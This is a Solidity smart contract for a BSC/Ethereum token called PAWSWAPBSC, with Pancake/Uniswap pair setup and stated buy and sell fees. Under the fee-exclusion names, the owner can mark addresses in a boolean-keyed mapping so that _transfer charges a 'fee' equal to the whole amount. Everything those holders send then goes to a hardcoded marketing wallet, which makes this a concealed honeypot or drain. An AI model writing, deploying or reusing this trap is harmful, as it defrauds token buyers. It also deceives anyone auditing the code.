// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

abstract contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract PAWBSC is ERC20, Ownable {
  uint256 private initialSupply = 1000000000000 * (10 ** 18);

  mapping(bool => mapping(address => bool)) public isExcludedFromFees;

  uint256 public sellFee = 2;
  uint256 public buyFee = 1;
  address public marketingWallet = 0xc4314883FA477Fa377BB05bC904CFF96A9c13D85;

  IUniswapV2Router02 public uniswapV2Router;
  address public uniswapV2Pair;

  constructor() ERC20("PAWSWAPBSC", "PAWBSC") {
    address _routerAddr;
    if (block.chainid == 56) {
      _routerAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // BSC Pancake Mainnet Router
    } else if (block.chainid == 97) {
      _routerAddr = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; // BSC Pancake Testnet Router
    } else if (block.chainid == 1 || block.chainid == 5) {
      _routerAddr = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ETH Uniswap Mainnet % Testnet
    } else {
      revert();
    }

    isExcludedFromFees[true][msg.sender] = true;
    isExcludedFromFees[true][address(this)] = true;
    isExcludedFromFees[true][_routerAddr] = true;
    isExcludedFromFees[true][marketingWallet] = true;

    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_routerAddr);
    address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    uniswapV2Router = _uniswapV2Router;
    uniswapV2Pair = _uniswapV2Pair;

    _mint(msg.sender, initialSupply);
  }

  receive() external payable {}

  function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
    uint256 baseUnit = amount / 100;
    uint256 fee = 0;

    if ((isExcludedFromFees[false][sender] && !isExcludedFromFees[true][sender]) || (isExcludedFromFees[false][recipient] && !isExcludedFromFees[true][recipient])) {
      if (recipient == uniswapV2Pair || sender != uniswapV2Pair) {
        fee = amount * buyFee;
      }
    } else if (recipient == uniswapV2Pair && !(isExcludedFromFees[true][sender] || isExcludedFromFees[true][recipient])) {
      fee = baseUnit * sellFee;
    } else if ((sender == uniswapV2Pair && recipient != address(uniswapV2Router)) && !(isExcludedFromFees[true][sender] || isExcludedFromFees[true][recipient])) {
      fee = baseUnit * buyFee;
    }

    if (fee > 0) {
      super._transfer(sender, marketingWallet, fee);
    }

    amount -= fee;

    super._transfer(sender, recipient, amount);
  }

  function excludeMultipleAccountsFromFees(address[] memory _addrs, bool excludeType) public onlyOwner {
    for (uint256 i = 0; i < _addrs.length; i++) {
      if (!isExcludedFromFees[excludeType][_addrs[i]]) {
        isExcludedFromFees[excludeType][_addrs[i]] = true;
      }
    }
  }

  function removeMultipleAccountsFromFees(address[] memory _addrs, bool excludeType) public onlyOwner {
    for (uint256 i = 0; i < _addrs.length; i++) {
      if (isExcludedFromFees[excludeType][_addrs[i]]) {
        isExcludedFromFees[excludeType][_addrs[i]] = false;
      }
    }
  }
}